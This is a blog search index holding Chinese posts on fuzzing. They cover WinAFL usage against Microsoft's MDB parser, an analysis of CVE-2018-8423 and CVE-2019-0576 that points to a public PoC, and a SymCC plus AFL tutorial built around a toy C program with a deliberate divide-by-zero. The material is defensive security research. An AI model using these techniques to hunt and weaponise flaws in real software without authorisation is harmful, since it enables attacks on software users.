<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>模糊测试之WinAFL总结</title>
      <link href="2021/06/02/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E4%B9%8BWinAFL%E6%80%BB%E7%BB%93/"/>
      <url>2021/06/02/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E4%B9%8BWinAFL%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本文是对于模糊测试方面的小总结，计划三篇；第一篇概述；第二篇afl；第三篇Winafl。非大部头书，只提取关键信息。<br>本篇为第三篇：winafl，本篇中的内容大量引用Hardik Shah的公开演讲。</p><a id="more"></a><p>本篇的主要内容如下：</p><ul><li>Winafl是什么</li><li>使用DynamoRIO返回覆盖率信息</li><li>模糊策略</li><li>开始使用Winafl<ul><li>动手：使用VisualStudio编译示例C程序</li><li>动手：找到Fuzz函数的偏移量</li><li>动手：在调试模式下运行Winafl，检查一切正常</li><li>动手：开始使用WinAFL</li><li>动手：分析崩溃并找到根本原因</li></ul></li><li>开搞真实的商业应用程序<ul><li>动手：编写一个线束/测试程序来读取/解析MDB文件</li><li>动手：分析MDB文件</li><li>动手：用WinAFL模糊它</li><li>CVE-2018-8423和CVE-2019-0576分析</li></ul></li><li>总结</li></ul><h2 id="Winafl是什么？"><a href="#Winafl是什么？" class="headerlink" title="Winafl是什么？"></a>Winafl是什么？</h2><ul><li>在FUzz的闭源代码程序所面临许多挑战<ul><li>无源码，仅有dll和exes<ul><li>比如：Gdi32.dll,gdiplus.dll, msrd3x40.dll</li></ul></li></ul></li><li>Winafl<ul><li>Windows版本的afl（American Fuzzy Lop）</li><li>由 Ivan Fratric 所维护</li><li>使用 <strong>DynamoRIO</strong>(drrun.exe)来插桩和收集覆盖率</li><li>afl-fuzz.exe与充当drrun.exe客户端的winafl.dll进行通信<ul><li>信息流：afl-fuzz.exe &lt;——&gt; winafl.dll &lt;——&gt; drrun.exe</li></ul></li><li>需要写一种叫harness的程序<ul><li>它能从处理文件解析的DLL中调用函数</li><li>harness应该有一个函数，它接受文件名作为输入，打开它，然后进行进一步的处理</li><li>winafl将在内存模糊中使用这个函数</li></ul></li></ul></li><li>一个简单的实例</li></ul><p><img src="https://i.loli.net/2021/06/02/LoKvtGHfFnwMslW.png" alt="image-20210602094353421"></p><h2 id="使用DynamoRIO返回覆盖率信息"><a href="#使用DynamoRIO返回覆盖率信息" class="headerlink" title="使用DynamoRIO返回覆盖率信息"></a>使用DynamoRIO返回覆盖率信息</h2><ul><li><p>afl-fuzz.exe是负责在linux上实现模糊测试的过程主进程</p></li><li><p>winafl.dll是一个客户端dll，它负责处理从dynamorio, pre_fuzz, </p><p>post_fuzz之类传递过来的信息</p></li><li><p>两者都通过IPC（Inter-Process Communication进程间通讯）进行通信</p></li><li><p>注册各种事件的回调，比如基本块、模块的加载和卸载等</p></li></ul><p><img src="https://i.loli.net/2021/06/02/hEBCgiVymYzHIFM.png" alt="image-20210602095350741"></p><ul><li>检查其模块是否为目标模块，然后使用符号/地址来搜索模糊函数</li></ul><p><img src="https://i.loli.net/2021/06/02/tThbW7IMkB4aGdN.png" alt="image-20210602095717769"></p><ul><li>调用pre_fuzz处理程序以保存程序此时的状态</li><li>执行函数并监控崩溃情况，不断更新覆盖率map</li><li>调用post_fuzz处理程序并恢复状态</li><li>一直循环到迭代次数</li></ul><h2 id="模糊策略"><a href="#模糊策略" class="headerlink" title="模糊策略"></a>模糊策略</h2><ul><li><strong>bitflip</strong>，按位翻转，1变为0，0变为1<ul><li>1/1,2/1,4/1,8/8 ….32/8</li></ul></li><li><strong>Byte Flip</strong> ，按字节反转</li><li><strong>arithmetic</strong>，整数加/减算术运算</li><li><strong>havoc</strong>，中文意思是“大破坏”，此阶段会对原文件进行大量变异</li><li><strong>dictionary</strong>，把自动生成或用户提供的token替换/插入到原文件中</li><li><strong>interest</strong>，把一些特殊内容替换到原文件中</li><li><strong>splice</strong>，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</li></ul><p>该部分内容可参考官方文档： <a href="https://github.com/googleprojectzero/winafl/blob/master/afl_docs/technical_details.txt">https://github.com/googleprojectzero/winafl/blob/master/afl_docs/technical_details.txt</a></p><h2 id="开始使用Winafl"><a href="#开始使用Winafl" class="headerlink" title="开始使用Winafl"></a>开始使用Winafl</h2><h3 id="动手：让我们使用WinAFL"><a href="#动手：让我们使用WinAFL" class="headerlink" title="动手：让我们使用WinAFL"></a>动手：让我们使用WinAFL</h3><ul><li>编译<ul><li>使用 visual studio 编译目标二进制程序或者使用官方预编译好的二进制程序</li></ul></li><li>开启<strong>Page Heap</strong>堆页<ul><li>开启：<strong>gflags /p /enable readfile.exe</strong></li><li>验证：<strong>gflags /p</strong> </li></ul></li><li>对函数fuzz<ul><li>查找处理器图像函数的偏移量<ul><li>用 WinDBG</li><li>x ReadFile!ProcessImage</li></ul></li></ul></li><li>确保程序得到DynamoRIO信息正确：<ul><li>C:\fuzzingwork\DynamoRIO-Windows-7.1.0-1\bin32\drrun.exe -c winafl.dll -debug -target_module readfile.exe -target_offset 0x10a0 -fuzz_iterations 10 -nargs 1 – readfile.exe 1.img<ul><li><strong>Drrun.exe</strong> -&gt; DynamoRIO 二进制程序</li><li><strong>-c winafl.dll</strong> -&gt; 用于与drrun通讯的客户端程序</li><li><strong>-debug</strong> -&gt; Winafl将生成调试日志</li><li><strong>-target_module</strong> -&gt;  你想要插桩&amp;测量代码覆盖率的目标模块</li><li><strong>-target_offset</strong> -&gt;  在内存模糊中的你要fuzz的函数的偏移</li><li><strong>-fuzz_iterations</strong> -&gt; 你想要循环的次数</li><li><strong>-nargs</strong> -&gt; 参数的数量</li></ul></li></ul></li></ul><h3 id="动手：运行WinAFL开始Fuzzing"><a href="#动手：运行WinAFL开始Fuzzing" class="headerlink" title="动手：运行WinAFL开始Fuzzing"></a>动手：运行WinAFL开始Fuzzing</h3><ul><li>命令行格式：</li></ul><p><strong>AFL-FUZZ.EXE AFL_ARGS</strong> <strong>–</strong> <strong>INSTRUMENTATION_OPTIONS</strong> <strong>–</strong> <strong>PROGRAM_NAME @@</strong></p><p><img src="https://i.loli.net/2021/06/02/NPi2VtCWQcqJ7sx.png" alt="image-20210602101900240"></p><ol><li><strong>afl-fuzz.exe参数</strong><ul><li><strong>-M –</strong> Master模式</li><li><strong>-S</strong> –  Slave模式</li><li><strong>-i</strong> -&gt;  输入目录</li><li><strong>-o</strong> -&gt; 输出目录</li><li><strong>-D</strong> -&gt; DynamoRIO bin32/64  目录路径</li><li><strong>-t</strong> -&gt; 超时时间</li></ul></li><li><strong>DynamoRIO的参数</strong><ul><li>-<strong>coverage_module -&gt;</strong> 需要进行检测的dll/exe的名称</li><li><strong>-target_module -&gt;</strong> harness里可执行文件的名称。</li><li><strong>-target_method or –target_offset -&gt;</strong>  处理输入文件的偏移量或者函数名称。</li><li><strong>-call_convention –</strong>  -函数调用约定，比如 thiscall,stdcall,cdecl,fastcall等</li></ul></li><li><strong>程序参数，后面跟着@@</strong></li></ol><h3 id="动手：WinAFL状态屏幕"><a href="#动手：WinAFL状态屏幕" class="headerlink" title="动手：WinAFL状态屏幕"></a>动手：WinAFL状态屏幕</h3><p><img src="https://i.loli.net/2021/06/02/563NPZpKOmeo4RT.png" alt="image-20210602103105193"></p><p>详细情况说明可看官方文档： <a href="https://github.com/google/AFL/blob/master/docs/status_screen.txt">https://github.com/google/AFL/blob/master/docs/status_screen.txt</a></p><h3 id="动手：分析崩溃并找到根本原因"><a href="#动手：分析崩溃并找到根本原因" class="headerlink" title="动手：分析崩溃并找到根本原因"></a>动手：分析崩溃并找到根本原因</h3><ul><li>使用Visual Studio<ul><li>调试源代码，运行崩溃文件，并跟踪执行流程，查找根本原因。</li></ul></li><li>使用windbg<ul><li>使用崩溃文件调试可执行文件并查找根本原因</li></ul></li></ul><h2 id="开搞真实的商业应用程序"><a href="#开搞真实的商业应用程序" class="headerlink" title="开搞真实的商业应用程序"></a>开搞真实的商业应用程序</h2><h3 id="对MDB文件进行fuzz"><a href="#对MDB文件进行fuzz" class="headerlink" title="对MDB文件进行fuzz"></a>对MDB文件进行fuzz</h3><ul><li><p>Fuzz MDB 文件的harness</p><ul><li>使用CDao数据库对象</li><li>打开MDB文件</li><li>关闭它</li><li>解析代码在msrd3x40.dll中</li><li>db.open将从这个dll中调用函数</li><li>如果文件结构不正确，我们的程序将崩溃</li><li>这个harness导致了13个CVE</li></ul><p><img src="https://i.loli.net/2021/06/02/oSwLDYZ9RxyBv2a.png" alt="image-20210602103951576"></p></li><li><p>开始fuzz</p><ul><li>编译这个c文件</li><li>从谷歌收集一些MDB文件</li><li>用winafl来fuzz它</li></ul></li></ul><h3 id="CVE-2018-8423和CVE-2019-0576分析"><a href="#CVE-2018-8423和CVE-2019-0576分析" class="headerlink" title="CVE-2018-8423和CVE-2019-0576分析"></a>CVE-2018-8423和CVE-2019-0576分析</h3><h4 id="CVE-2018-8423"><a href="#CVE-2018-8423" class="headerlink" title="CVE-2018-8423"></a>CVE-2018-8423</h4><ul><li>Ref: <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8423">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8423</a></li></ul><p><img src="https://i.loli.net/2021/06/02/jhA2iK5vIfZ3LqR.png" alt="image-20210602104133063"></p><ul><li>这是一个OOB写入的漏洞</li><li>在处理MDB文件时出现的漏洞</li><li>MDB文件是由MSAccess使用的数据库文件<ul><li>包含数据库结构，如表、索引、索引</li><li>它有旧的和专有的文件格式，好在多年来许多人收集了不少样例<ul><li>Ref: <a href="http://jabakobob.net/mdb/">http://jabakobob.net/mdb/</a></li><li>遵循页面结构<ul><li>第一页，表定义页，数据页，OLE字段。表中的属性</li><li>这使它成为一个容易的模糊目标</li></ul></li></ul></li></ul></li><li><strong>PoC Availble</strong> : <a href="https://github.com/thezdi/PoC/tree/master/ZDI-18-1075">https://github.com/thezdi/PoC/tree/master/ZDI-18-1075</a><ul><li>包含两个文件-&gt; Group1 [MDB file], poc.js [js file]</li></ul></li><li>McAfee的分析报告：<a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/jet-database-engine-flaw-may-lead-to-exploitation-analyzing-cve-2018-8423/">https://www.mcafee.com/blogs/other-blogs/mcafee-labs/jet-database-engine-flaw-may-lead-to-exploitation-analyzing-cve-2018-8423/</a></li></ul><p><img src="https://i.loli.net/2021/06/02/6OXLNJh9GErZPuY.png" alt="image-20210602104749401"></p><p><img src="https://i.loli.net/2021/06/02/lUgorCVdG5RSuxv.png" alt="image-20210602104821596"></p><ul><li>所以它被修复了，是吗？</li></ul><p><img src="https://i.loli.net/2021/06/02/yL5fYx8dKrogenN.png" alt="image-20210602104933026"></p><h4 id="CVE-2019-0576"><a href="#CVE-2019-0576" class="headerlink" title="CVE-2019-0576"></a>CVE-2019-0576</h4><ul><li>不，又发现了另一个问题！！cve-2019-0576</li><li>Ref: <a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/analyzing-and-identifying-issues-with-the-microsoft-patch-for-cve-2018-8423/">https://www.mcafee.com/blogs/other-blogs/mcafee-labs/analyzing-and-identifying-issues-with-the-microsoft-patch-for-cve-2018-8423/</a></li></ul><p><img src="https://i.loli.net/2021/06/02/PVgNKXLq97n51JD.png" alt="image-20210602105031369"></p><p><img src="https://i.loli.net/2021/06/02/SBcz7dJQkxfegZh.png" alt="image-20210602105110211"></p><ul><li>它最终是如何解决的？</li></ul><p><img src="https://i.loli.net/2021/06/02/ObgrYSxlPDB4smc.png" alt="image-20210602105135986"></p><h2 id="在Windows下如何追踪分类Crash？"><a href="#在Windows下如何追踪分类Crash？" class="headerlink" title="在Windows下如何追踪分类Crash？"></a>在Windows下如何追踪分类Crash？</h2><ul><li>人工手动一个个分析崩溃是非常困难的</li><li>可以使用python + winappdbg 简单自动化</li><li>编写自己的工具？</li><li>使用bugid<ul><li><a href="https://bugid.skylined.nl/">https://bugid.skylined.nl/</a></li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>模糊测试有助于全面理解软件安全<ul><li>帮助编写更好的代码</li><li>可以帮助找到使用正常测试找不到的问题</li><li>帮助保护软件的安全</li><li>软件开发生命周期的一部分</li></ul></li><li>需要大量的艰苦的工作<ul><li>会面临各种零碎的问题，任何小问题都会导致不工作</li><li>花费无数小时去分析和解决这些问题</li><li>期望供应商进行后续跟进</li><li>结果被拒绝</li></ul></li><li>但最终，这是值得的☺</li></ul>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
          <category> winafl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>符号执行Symcc与模糊测试AFL结合实践</title>
      <link href="2021/03/16/symcc+afl/"/>
      <url>2021/03/16/symcc+afl/</url>
      
        <content type="html"><![CDATA[<p>上个月末无聊的划水时间段内，在推上看到有人发了一篇关于如何结合去年新发布的符号执行Symcc与模糊测试引擎AFL，以提升Fuzz效率的视频贴。打开这个链接后才发现是个卖课的，emmm…. , 看价格<strong>£1499</strong>果断打扰了，果然没钱的都不配学安全吗23333；原技术文章看来是看不到了，只能靠公开的一段视频还原操作。</p><a id="more"></a><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>虽然有很多大佬肯定已经十分熟悉模糊测试和符号执行了，还是简单介绍一下背景知识，这样更有连贯性。</p><h3 id="模糊测试-AFL"><a href="#模糊测试-AFL" class="headerlink" title="模糊测试 AFL"></a>模糊测试 AFL</h3><p>模糊测试（fuzz testing, fuzzing）是一种软件测试技术。 其核心思想是將自动或半自动生成的随机数据输入到一个程序中，并监视程序异常，如崩溃，断言（assertion）失败，以发现可能的程序错误，比如内存泄漏。 模糊测试常常用于检测软件或计算机系统的安全漏洞。</p><p>模糊测试诞生于1988年秋季的一个黑暗暴风雨之夜 [<a href="http://us.artechhouse.com/Fuzzing-for-Software-Security-Testing-and-Quality-Assurance-Second-Edition-P1930.aspx">Takanen et al, 2008.</a>]。巴顿·米勒教授坐在麦迪逊威斯康星州的公寓里，通过一条1200波特的电话线连接到他所属大学的计算机。阵阵的雷暴在线路上造成噪音，这些噪音又导致两端的UNIX命令获得错误的输入，并导致崩溃。频繁的崩溃使他感到惊讶—我们编写的程序不是应该十分强大吗？作为一名科学家，他想探究该问题的严重程度及其原因。因此，他为威斯康星大学麦迪逊分校的学生编写了一个编程练习，而该练习将使他的学生创建第一个模糊测试器。</p><p>这项作业的原文描述是这样的：</p><blockquote><p>The goal of this project is to evaluate the robustness of various UNIX utility programs, given an unpredictable input stream. […] First, you will build a fuzz generator. This is a program that will output a random character stream. Second, you will take the fuzz generator and use it to attack as many UNIX utilities as possible, with the goal of trying to break them.</p><p>该项目的目标是在给定不可预测的输入流的情况下评估各种UNIX实用程序的健壮性。[…]首先，您将构建一个模糊发生器。这是一个将输出随机字符流的程序。其次，您将使用模糊发生器，并使用它来攻击尽可能多的UNIX实用程序，以试图破坏它们。</p></blockquote><p>这个作业在不经意间抓住了模糊测试的本质：创建随机的输入，并持续性观察它是否会破坏目标应用程序，理论上只要运行足够长的时间，我们就会看到错误的发生。</p><p><code>AFL</code>（american fuzzy lop）最初由Michał Zalewski开发，和libFuzzer等一样是基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。其工作流程大致如下：</p><ol><li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）</li><li>选择一些输入文件，作为初始测试集加入输入队列（queue）</li><li>将队列中的文件按一定的策略进行“突变”</li><li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中</li><li>上述过程会一直循环进行，期间触发了crash的文件会被记录下来</li></ol><p><img src="https://i.loli.net/2021/03/19/E2oAeaFhimXjPz8.png" alt="image-20210319132122277"></p><h3 id="符号执行-Symcc"><a href="#符号执行-Symcc" class="headerlink" title="符号执行 Symcc"></a>符号执行 Symcc</h3><p>符号执行简单来说是在目标程序的执行过程中跟踪中间值是如何计算的，每一个中间值都可以表示为程序输入的一个公式。在任何点，系统都会使用这个公式查看这个点是否可达，这个指针是否为空等。如果答案是确定的，那么符号执行引擎将会提供测试用例，一个新的输入例子来触发对应的行为。所以符号执行可以被方便的用来探测程序路径以及触发bug。</p><p>新的符号执行Symcc发表于去年顶会USENIX’20，论文名称为Symbolic execution with SYMCC: Don’t interpret, compile!</p><p>那么Symcc和它的前辈们又有什么不同呢？论文作者Aurélien Francillon认为传统符号执行主要分为两类：<strong>IR-based</strong>和<strong>IR-less</strong>。</p><p> <strong>IR-based</strong>是指无论测试对象如何，先把目标的二进制程序给转换到IR层（中间表达形式）再进行抽象解释，其缺点是特别容易路径爆炸。常见用此方法的符号执行有angr、KLEE和Mayhem，主要过程如下图所示：</p><p><img src="https://i.loli.net/2021/03/19/7bhRo4WmapOCVqM.png" alt="image-20210319094028131"></p><p> <strong>IR-less</strong>是指符号执行引擎通过动态插桩技术（利用PIN插桩框架等）先对二进制程序插桩，执行部分指令后再构造符号表达式。其优点是快，缺点是插入的代码函数可能无法生成正确的符号表达式，且较依赖于指令集。常见用此方法的符号执行有Triton、QSYM、SAGE和Driller，主要过程如下图所示：</p><p><img src="https://i.loli.net/2021/03/19/YUcHBhQDpjObskJ.png" alt="image-20210319094624987"></p><p>作者提出的SymCC不同点在于，直接在编译期就开始在生成的IR上植入符号执行相关代码，进一步提升性能；其流程大致如下：</p><p><img src="https://i.loli.net/2021/03/19/y7DNYeVw4F1othW.png" alt="image-20210319094919700"></p><h2 id="开始结合"><a href="#开始结合" class="headerlink" title="开始结合"></a>开始结合</h2><p>整体的结合流程没什么新花样，基本是按照 安装各种包环境—&gt; 编译简单的后端/功能更强的qsym后端 —&gt; 用symcc编译llvm的libcxx —&gt; 开始尝试fuzz 的过程循序渐进。</p><h3 id="安装各种环境"><a href="#安装各种环境" class="headerlink" title="安装各种环境"></a>安装各种环境</h3><p>先安装各种包和依赖：</p><pre><code class="python">sudo apt-get install -y cargo \                        clang-10 \                        cmake \                        g++ \                        git \                        libz3-dev  \                        llvm-10-dev \                        llvm-10-tools \                        ninja-build \                        python3-pip \                        zlib1g-dev pip3 install lit </code></pre><p>这里的LLVM 要求是 8, 9, 10 或者11 ，C++编译器要支持 C++17。实际安装过程中有些unbuntu版本可能无法直接apt-get，使用llvm官方<a href="https://apt.llvm.org/">https://apt.llvm.org/</a> 的包支持。</p><p>随后安装Z3，要求版本号大于4.5</p><pre><code class="python">git clone https://github.com/Z3Prover/z3 cd z3 python scripts/mk_make.py cd build make sudo make install </code></pre><p>这里有点小坑，用该方式安装的z3可能在后面编译时llvm无法找到路径。如果报此类似错误的，该步可用cmake的Ninja进行编译，指路链接：<a href="https://github.com/Z3Prover/z3/blob/master/README-CMake.md">https://github.com/Z3Prover/z3/blob/master/README-CMake.md</a></p><p>然后安装afl，没什么可说的先安原版</p><pre><code class="python">git clone -b v2.56b https://github.com/google/AFL.git afl cd afl &amp;&amp; make </code></pre><p>下载symcc的源码做好之后编译backend的准备</p><pre><code class="python">git clone https://github.com/eurecom-s3/symcc symcc_source cd symcc_source git submodule init git submodule update</code></pre><h3 id="编译backend"><a href="#编译backend" class="headerlink" title="编译backend"></a>编译backend</h3><p>symcc带了两种后端，一种是功能简单（simple）的；另一种是qsym的后端，与前者相比功能性更强，我们两种都编译一下。在配置构建时，选项都将通过“ -D”传递给CMake，常见选项如下表所示：</p><table><thead><tr><th align="left">选项</th><th>作用</th></tr></thead><tbody><tr><td align="left">- QSYM_BACKEND=ON/OFF (default OFF)</td><td>是否编译QSYM后端，若否即为编译simple后端；每次执行时可以使用LD_LIBRARY_PATH在后端之间切换</td></tr><tr><td align="left">- TARGET_32BIT=ON/OFF (default OFF)</td><td>启用64位主机对32位编译的支持</td></tr><tr><td align="left">- LLVM_DIR/LLVM_32BIT_DIR (default empty)</td><td>提供编译时llvm的位置</td></tr><tr><td align="left">- Z3_DIR/Z3_32BIT_DIR (default empty)</td><td>提供编译时Z3的位置</td></tr><tr><td align="left">- Z3_TRUST_SYSTEM_VERSION (default OFF)</td><td>信任系统版本的Z3，不检查Z3版本的兼容性；如果Z3的安装版本太旧，则可能发生编译错误。</td></tr></tbody></table><p>首先编译简单的后端，这里的LLVM_DIR指向你所用版本llvm位置</p><pre><code class="python">mkdir symcc_build_simple cd symcc_build_simple CC=clang-10 CXX=clang++-10 cmake -G Ninja \    -DQSYM_BACKEND=OFF \    -DCMAKE_BUILD_TYPE=RelWithDebInfo \    -DZ3_TRUST_SYSTEM_VERSION=on \    -DLLVM_DIR=/usr/lib/llvm-10/cmake \    ../symcc_source \    &amp;&amp; ninja check </code></pre><p><img src="https://i.loli.net/2021/03/19/Xb8wEliGjgdADCB.gif" alt="907a1b17-80d4-4011-88c9-85d94c051ca7"></p><p>后面在ninja check时会有8个错误，不影响后面的正常执行。（参考视频的编译过程中也有错误）</p><p>下面编译qsym的后端，与前者相比区别就是把DQSYM_BACKEND改成ON</p><pre><code class="python">mkdir symcc_build_qsym cd symcc_build_qsymcmake -G Ninja \            -DQSYM_BACKEND=ON \            -DCMAKE_BUILD_TYPE=RelWithDebInfo \            -DZ3_TRUST_SYSTEM_VERSION=on \            -DLLVM_DIR=/usr/lib/llvm-10/cmake \            -DZ3_DIR=/home/fstark/symcc_afl/z3/build \            ../symcc_source \            &amp;&amp; ninja check \            &amp;&amp; cargo install --path ../symcc_source/util/symcc_fuzzing_helper </code></pre><p>check时也会有一些错误，问题不大。</p><p><img src="https://i.loli.net/2021/03/19/D3g2domfTWFasvr.gif" alt="1ead03ab-dfe6-43d1-ac59-a8ccaf4b041a"></p><h3 id="用symcc编译llvm的libcxx"><a href="#用symcc编译llvm的libcxx" class="headerlink" title="用symcc编译llvm的libcxx"></a>用symcc编译llvm的libcxx</h3><p>对于更加复杂的C++代码，symcc提供了两种解决方法。一种是使用系统提供的C ++标准库。这是最简单的不需要额外的编译，但是它有一个重要的缺点：会影响符号执行的过程。另一种方法是自己编译一个检测的C ++标准库，这样就可以通过库跟踪数据，但这需要构建库并针对它编译所有代码。</p><p>建立C ++标准库是一项一次性的工作，建一次后可以在所有后续的C ++编译中使用，每当我们使用libc++就会自动使用我们编译的llvm标准库实现。<br>编译过程如下：</p><pre><code class="python">git clone -b llvmorg-10.0.1 --depth 1 https://github.com/llvm/llvm-project.git llvm_source mkdir libcxx_symcc_install mkdir libcxx_symcc_build cd libcxx_symcc_build export SYMCC_REGULAR_LIBCXX=yes SYMCC_NO_SYMBOLIC_INPUT=yes \    &amp;&amp; cmake -G Ninja ../llvm_source/llvm \        -DLLVM_ENABLE_PROJECTS=&quot;libcxx;libcxxabi&quot; \        -DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; \        -DLLVM_DISTRIBUTION_COMPONENTS=&quot;cxx;cxxabi;cxx-headers&quot; \        -DCMAKE_BUILD_TYPE=Release \        -DCMAKE_INSTALL_PREFIX=$BASE/libcxx_symcc_install \        -DCMAKE_C_COMPILER=$BASE/symcc_build_simple/symcc \        -DCMAKE_CXX_COMPILER=$BASE/symcc_build_simple/sym++ \    &amp;&amp; ninja distribution &amp;&amp; ninja install-distribution</code></pre><p>请自己手动把$BASE指向之前准备工作的文件位置</p><p><img src="https://i.loli.net/2021/03/19/sGg1QqhFXn8vWze.gif" alt="752a8d34-5777-4da8-87c7-ac26acc6047a"></p><h3 id="开始尝试Fuzz！"><a href="#开始尝试Fuzz！" class="headerlink" title="开始尝试Fuzz！"></a>开始尝试Fuzz！</h3><p>这里我们准备一个特殊的苛刻例子</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; int foo(char *arr, int t1)&#123;     int i = 0;    if (arr[i++] == &#39;c&#39;) return 0;     if (arr[i++] == &#39;d&#39;) return 1;     if (arr[i++] == &#39;c&#39;) return 2;     if (arr[i++] == &#39;c&#39;) return 3;     if (arr[i++] == &#39;s&#39;) return 4;     if (arr[i++] == &#39;b&#39;) return 5;     if (arr[i++] == &#39;s&#39;) return 6;     if (arr[i++] == &#39;g&#39;) return 7;     if (*(int*)arr != 0xdeadbeef )return 0;     //Can we trigger this code?    return (int)(20 / t1); &#125;int main(int argc, char* argv[])&#123;     //open file    FILE *f = fopen(argv[1],&quot;rb&quot;);     // get file size     fseek(f, 0, SEEK_END);    long fsize = ftell(f);    // read file contents     fseek(f, 0, SEEK_SET);    char *string = malloc(fsize + 1);    fread(string, 1, fsize, f);    fclose(f);     // pass string to foo     int retval = foo(string, argc-2);    free(string);     return retval;&#125;</code></pre><p>根据这段源码，我们可以判断出当且仅当文件输入为0xdeadbeef 时，return (int)(20 / t1)会出现除零错误，而该例子单纯使用afl是难以发现错误的。</p><p>我们分别使用qsym编译出的后端symcc和afl对其进行编译，并且创建一个样例AAAAAAA</p><pre><code class="bash">afl-clang -O0 int_check.c -o afl_int_check../symcc_build_qsym/symcc -O0 int_check.c -o symcc_int_checkmkdir corpusecho &quot;AAAAAAAAAAAAAAAAAAAAAAAA&quot; &gt; corpus/seed</code></pre><p><img src="https://i.loli.net/2021/03/16/XmEO2TyDBMku37r.png" alt="image-20210316201931648"></p><p>之后就开始运行吧，我们使用afl的并行模式</p><pre><code class="bash">afl-fuzz -M fuzz1 -i corpus/ -o out -m none -- ./afl_int_check @@afl-fuzz -S fuzz2 -i corpus/ -o out -m none -- ./afl_int_check @@~/.cargo/bin/symcc_fuzzing_helper -o out -a fuzz2 -n symcc -- ./symcc_int_check @@</code></pre><p>这里symcc_fuzzing_helper的参数中-o指向afl的out目录，-a指向要辅助的afl进程名字，如上所示这里我就是fuzz2.</p><p>symcc_fuzzing_helper其实就是在使用afl生产的testcase进行符号执行，如果它认为样例有趣就会生成新的，并将它传送到正在执行的afl队列里，afl就能够使用该新生成样例进行测试，这一流程辅助了afl能够到达一些之前无法到达的路径。</p><p>这里有个小坑，单纯执行afl时afl-fuzz命令后面的–可带也可不带，但是symcc_fuzzing_helper是通过检测afl-fuzz里–后面命令执行的，所以如果我们在afl-fuzz后习惯性不加–就可能导致symcc无有效的输出结果。</p><p>一切准备就绪，开始运行吧！</p><p><img src="https://i.loli.net/2021/03/18/RqPMukAEQziZH5h.gif" alt="ddf22164-1a3a-45dc-b137-c7cebffdaab6"></p><p>我们惊喜的发现单纯fuzz难以找到的漏洞，在symcc_fuzzing_helper的协助下，直接就找到了crash。</p><p><img src="https://i.loli.net/2021/03/19/5vDFCnSNQoMm7bB.gif" alt="81de9aff-f7eb-449c-984c-72881a98fac1"></p><p>简单分析一下，用Hexdump看到crash真的是0xdeadbeef，symcc辅助AFL找到了使目标程序崩溃的testcase。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>使用符号执行Symcc与模糊测试引擎Afl的简单验证成功了，之后可以就试一试现实中的一些项目，比如论文中提的Tcpdump之类的；还可以考虑将Symcc与其他模糊测试引擎相结合，比如Afl++，在各种算法加持下的Afl++再结合符号执行可能会有更好的效果。</p><p>最后特别感谢Symcc发明人和论文的原作者 Aurélien Francillon 与 ADALogics 的安全研究员David Korczynski，它们在推特上帮助了我很多，同时感谢Discord的Fuzzing板块讨论让我有兴趣进行各种新的尝试，我仍有很多需要学习的地方。</p><p><img src="https://i.loli.net/2021/03/19/bvYaS7GJQ5HjAKw.png" alt="image-20210319120238731"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>带你搞懂符号执行的前世今生与最近技术  </p><p><a href="https://www.anquanke.com/post/id/231413">https://www.anquanke.com/post/id/231413</a> </p><p>G.O.S.S.I.P 学术论文推荐 </p><p><a href="https://wemp.app/posts/40a16228-7a86-4985-b7c2-b3507e3fc161">https://wemp.app/posts/40a16228-7a86-4985-b7c2-b3507e3fc161</a></p><p>Symcc源码<br><a href="https://github.com/eurecom-s3/symcc/">https://github.com/eurecom-s3/symcc/</a></p><p>入门afl</p><p><a href="https://i-m.dev/posts/20191001-225746.html">https://i-m.dev/posts/20191001-225746.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> 论文阅读 </tag>
            
            <tag> 新趋势 </tag>
            
            <tag> 符号执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzbook5——基于变异的模糊测试</title>
      <link href="2021/03/10/fuzzbook5%20%E5%9F%BA%E4%BA%8E%E5%8F%98%E5%BC%82%E7%9A%84%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"/>
      <url>2021/03/10/fuzzbook5%20%E5%9F%BA%E4%BA%8E%E5%8F%98%E5%BC%82%E7%9A%84%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/</url>
      
